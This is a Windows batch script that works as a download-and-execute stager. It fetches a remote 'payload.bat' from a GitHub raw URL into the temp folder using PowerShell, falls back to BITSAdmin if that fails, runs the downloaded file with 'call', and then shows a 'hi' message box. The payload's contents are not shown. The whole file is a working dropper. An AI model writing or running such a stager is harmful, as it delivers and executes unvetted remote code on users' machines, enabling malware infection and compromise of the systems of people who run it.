@echo off
setlocal

:: Define the URL of the payload script to download
set "PAYLOAD_URL=https://raw.githubusercontent.com/wicorn29/batch/main/payload.bat"

:: Define the destination path for the payload script
set "PAYLOAD_PATH=%TEMP%\payload.bat"

:: Download the payload script using PowerShell
echo Downloading payload script from %PAYLOAD_URL% to %PAYLOAD_PATH%...
powershell -Command "try { Invoke-WebRequest -Uri %PAYLOAD_URL% -OutFile %PAYLOAD_PATH% } catch { exit 1 }"
if %errorlevel% neq 0 (
    echo PowerShell download failed. Trying BITSAdmin...
    bitsadmin /transfer "Job" %PAYLOAD_URL% %PAYLOAD_PATH%
)

:: Check if the download was successful
if exist %PAYLOAD_PATH% (
    echo Payload script downloaded successfully.

    :: Run the payload script
    call %PAYLOAD_PATH%

    :: Show a popup saying "hi"
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('hi')"
) else (
    echo Failed to download the payload script.
)

endlocal
exit
